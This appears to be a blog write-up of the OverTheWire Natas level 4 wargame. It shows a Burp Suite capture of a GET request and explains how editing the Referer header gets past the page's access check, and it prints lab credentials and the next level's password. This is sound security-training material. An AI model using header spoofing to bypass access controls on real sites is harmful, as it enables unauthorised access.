---
layout: post
title: Overthewire Natas Level 4
subtitle: ... Write up
tags: [overthewire, natas, level4, overthewire-natas, writeup]
---

## Natas Level 4
* Username: natas4
* Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
* URL:      http://natas4.natas.labs.overthewire.org


**Step 1:** Let Login to the URL, you will see the message
> Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" Refresh page

**Step 2:** Let refresh the page, still the same. Read carefully the message again. It means that we are access the page from "" (nothing). What they need is before we access this page need to come from _"http://natas5.natas.labs.overthewire.org/"_. Oh wow. How could we do that?

**Step 3:** I Tried to refresh the page a fews time. The message changes to
> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" Refresh page

Step 4: Strategy is to make to make the _You are visiting from ""_ become _You are visiting from "http://natas5.natas.labs.overthewire.org/"_. Open Burp Suite Community Edition. If you are unsure how to use Burp Suite, feel free to contact me, I can show you how to use it. Now, Let capure the GET request by Burp
```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas4.natas.labs.overthewire.org/index.php
Cookie: __cfduid=dc69616187b4a387a963c02e8d931c8f61524815545; __utma=176859643.1702516967.1524815549.1524815549.1524836149.2; __utmz=176859643.1524815549.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Upgrade-Insecure-Requests: 1
```

**Step 5:** Look at the Referer, it is what we want to change. Edit _http://natas4.natas.labs.overthewire.org/index.php_ to _http://natas5.natas.labs.overthewire.org/_ and click Forward on Burp and Hooray! Come back to our Web broswer, we got
```html
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
Refresh page
```
